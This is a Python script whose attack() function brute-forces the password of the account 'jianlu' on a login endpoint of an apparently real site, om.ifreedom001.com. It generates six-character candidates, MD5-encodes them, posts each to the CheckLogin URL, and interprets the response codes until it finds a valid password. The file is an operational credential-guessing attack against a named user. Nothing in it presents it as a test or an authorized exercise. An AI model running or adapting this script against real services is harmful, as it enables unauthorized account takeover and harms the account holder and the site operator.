# -*- coding: utf-8 -*-

import helper
import urllib


def attack():
    print("attack start!")
    loginUri = "http://om.ifreedom001.com/Login/CheckLogin"
    result = {"-1": "ERROR_ACCOUNT_NOT_EXISTS", "2": "ERROR_ACCOUNT_LOCKED",
              "4": "ERROR_PASSWORD_WRONG",  "3": "VALID_ACCOUNT_AND_PASSWORD"}
    ERROR_ACCOUNT_NOT_EXISTS = -1
    ERROR_ACCOUNT_LOCKED = 2
    ERROR_PASSWORD_WRONG = 4
    VALID_ACCOUNT_AND_PASSWORD = 3

    passwordGenerator = helper.generatePassword(6)

    for p in passwordGenerator:
        newpassword = helper.md5Encode(p)
        print("try password: %s" % p)
        params = urllib.urlencode(
            {'Account': 'jianlu', 'Password': '%s' % newpassword})

        response = urllib.urlopen(loginUri, params)
        data = response.read()

        print('Status: %s, result: %s' % (response.code, result[data]))
        if int(data) == VALID_ACCOUNT_AND_PASSWORD:
            print("jianlu's password is: %s" % p)
            break


if __name__ == '__main__':
    attack()
